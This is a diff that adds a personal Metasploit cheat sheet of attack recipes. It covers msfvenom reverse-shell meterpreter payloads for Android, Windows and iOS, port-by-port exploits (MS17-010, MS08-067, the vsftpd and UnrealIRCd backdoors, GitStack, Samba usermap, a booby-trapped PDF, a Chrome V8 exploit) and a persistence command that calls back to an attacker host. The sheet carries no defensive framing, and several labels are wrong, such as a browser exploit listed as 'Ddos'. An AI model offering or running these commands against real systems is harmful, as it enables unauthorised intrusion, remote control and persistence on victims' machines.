@@ -1,0 +1,149 @@
++----------+
+|msfconsole|
++----------+
++--------+
+|payloads|
++--------+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.25 LPORT=4444 -o <payload name>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.25 LPORT=4444 -o <payload name>
+msfvenom -p apple_ios/armle/meterpreter_reverse_tcp LHOST=192.168.0.14 LPORT=4444 -o <payload name>
+set LHOST <attacker ip addr>
+set payload
++------+
+|search|
++------+
+search portscan
+search ssh_version
+search smb
+grep scanner search smb
+grep exploit search smb
++--------------+
+|conputer hacks|
++--------------+
+for port 445
+nmap 0.0.0.0 -Pn
+nmap 0.0.0.0 -Pn -sV
+445 tcp smb file share
+search smb
+grep scanner search smb
+use auxiliary/scanner/smb/smb_ms17_010
+show options
+set RHOSTS
+run
+0.0.0.0:445 - Host is likely VULNERABLE to MS17-0101 WINDOWS 10 Pro 14393 x64 (64-bit)
+grep exploit search smb
+use exploit/windows/smb/ms17_010_psexec
+show options
+set payload windows/meterpreter/reverse_http
+set RHOSTS
+set LHOST
+exploit
+===============================
+for port 25
+use exploit/windows/smb/ms08_067_netapi
+set rhost 
+run
+===============================
+for port 21 ftp
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST
+exploit
+===============================
+for port 80 http
+use exploit/windows/http/gitstack_rce
+show options
+set RHOSTS
+set LHOST
+set LPORT 4444
+set payload windows/meterpreter/reverse_tcp
+exploit
+===============================
+for port 139
+use auxiliary/scanner/smb/smb_version
+set RHOSTS
+run
+exploit/multi/samba/usermap_script
+set RHOSTS
+set LHOST 192.168.0.14
+set LPORT 4444
+run
+===============================
+for port 1900
+use exploit/multi/http/spree_searchlogic_exec
+set RHOSTS
+set RPORT 1900
+set LHOST
+set LPORT
+===============================
+for port 8080 http
+use exploit/windows/scada/iconics_genbroker
+set RHOSTS target
+set RPORT 8080
+set LHOST
+set LPORT
+exploit
+===============================
+for port 8080 http
+use exploit/windows/http/hp_imc_java_deserialize
+set RHOSTS
+set RPORT
+LHOST 192.168.0.14
+LPORT 4444
+exploit
+===============================
+for port 6667
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+show options
+set RHOSTS
+show payloads
+set payload payload/cmd/unix/reverse
+show options
+set LHOST
+set LPORT
+exploit
++--------------------------+
+|phone hack without payload|
++--------------------------+
+use exploit/android/browser/webview_addjavascriptinterface
+set lhost
+set srvhost
+set URIPATH /
+exploit
++------------------+
+|PDF hacks         |
++------------------+
+use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs
+show options
+set FILENAME
+set LHOST
+set LPORT 4444
+run
+use exploit/multi/handler
+set lhost 
+set lport
+exploit
++----------+
+|port scan |
++----------+
+search portscan
+use auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS
+set THREADS 83
+run
+search portscan
+use auxiliary/scanner/portscan/syn
+show options 
+set RHOSTS 
+set THREADS 83
+run
++--------------+ 
+|Ddos exploit  |
++--------------+
+use exploit/multi/browser/chrome_cve_2021_21220_v8_insufficient_validation
+set LHOST 192.168.0.14
+set LPORT 4444
++--------------------+
+|maintaining accsess |
++--------------------+
+run persistence -p 4444 -r <host to connect back to>
